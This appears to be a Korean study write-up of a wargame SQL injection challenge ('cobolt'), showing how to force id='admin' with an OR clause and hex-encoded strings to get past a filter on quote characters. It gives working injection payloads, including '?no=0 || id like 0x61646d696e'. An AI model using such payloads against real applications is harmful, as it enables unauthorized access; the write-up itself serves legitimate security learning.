## Q3. cobolt _ 스트링 우회 기법
<img src="/photo/prob_03.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: ' / " / ` <br> 문제 사항: 쿼리에 id=admin을 만들어내라.
### 해결책

```
현재 쿼리문에서 id='guest'로 고정되어 있음
=> no에 id컬럼 만들어 admin 적용
=> || 이용
=> || 이므로 앞 조건은 거짓이 되도록함  
```
```diff
# 현재 쿼리문: where id='guest' and no=0 || id='admin'
```
```
but. 싱글쿼터가 제한됨
=> 싱글쿼터 없이 문자열 표현이 가능해야함
=> 스트링 우회 기법 사용
=> DB에서 16진수를 인식하므로 이를 이용
```
```
해결 쿼리문: id='guest' and no=0 || id like 0x61646d696e
```
### CERT <br> ?no=0 || id like 0x61646d696e

### 느낀점
```diff
+ 스트링 우회 기법에 대해 배웠다.
+ DB에서 16진수를 인식하므로 이를 이용한 방법이었다.

- 싱글쿼터 없이 문자열 표현할 수 있는 방법을 몰라서 힘들었다.
```

### 다른 풀이
?no=0 || 1 order by id asc
